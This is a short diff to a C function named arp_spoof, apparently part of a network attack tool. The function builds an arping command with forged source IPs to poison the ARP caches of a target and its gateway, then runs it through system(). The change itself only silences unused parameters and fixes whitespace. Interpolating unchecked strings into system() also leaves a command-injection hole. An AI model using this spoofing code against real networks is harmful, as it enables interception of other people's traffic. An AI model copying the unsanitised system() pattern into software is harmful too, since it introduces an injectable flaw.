@@ -28,15 +28,18 @@ bool arp_init() {
 
 bool arp_spoof(const char *target_ip, const char *target_mac,
                const char *gateway_ip, const char *our_mac) {
+    (void)target_mac;  // Unused parameter
+    (void)our_mac;     // Unused parameter
+
     LOGD("ARP spoof: target=%s, gateway=%s", target_ip, gateway_ip);
-    
+
     // Fallback to arping for now as it's reliable for spoofing if installed
     // Spoofing requires repeated sends which is handled well by arping's timing logic
     char cmd[512];
     snprintf(cmd, sizeof(cmd),
         "arping -U -c 1 -s %s %s && arping -U -c 1 -s %s %s",
         gateway_ip, target_ip, target_ip, gateway_ip);
-    
+
     int result = system(cmd);
     return result == 0;
 }
